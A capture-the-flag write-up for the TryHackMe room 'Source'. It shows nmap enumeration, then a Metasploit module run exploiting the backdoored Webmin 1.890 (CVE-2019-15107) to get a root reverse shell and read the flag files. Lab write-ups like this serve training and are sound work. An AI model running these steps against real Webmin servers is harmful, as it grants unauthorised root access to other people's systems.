---
title: "TryHackMe: Source — Writeup"
date: 2022-03-04 09:00:00 +0800
categories: [TryHackMe]
tags: [linux, ctf, mis-config, webmin]
---

## Overview

**Source** is an easy TryHackMe room that involves exploiting an outdated Webmin instance vulnerable to a known RCE via a backdoored version (CVE-2019-15107). Good introduction to leveraging public exploits and basic Linux enumeration.

---

## Recon

```bash
nmap -sC -sV -oN nmap/initial 10.10.x.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

Port 10000 — Webmin. Version **1.890** is interesting. A quick search reveals CVE-2019-15107: a backdoor introduced in the 1.890 release that allows unauthenticated RCE via the `password_change.cgi` endpoint.

---

## Exploitation

Using Metasploit's `exploit/linux/http/webmin_backdoor`:

```bash
msfconsole -q
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.10.x.x
set RPORT 10000
set SSL true
set LHOST tun0
run
```

Shell returned as **root** immediately — the backdoor runs as root since Webmin runs as root.

---

## Flags

```bash
cat /home/dark/user.txt   # user flag
cat /root/root.txt        # root flag
```

---

## Key Takeaway

Always check service versions during enumeration. A single outdated daemon here meant instant root — no privilege escalation needed. Webmin 1.890 was the only version affected; upgrading to 1.900+ patches it.
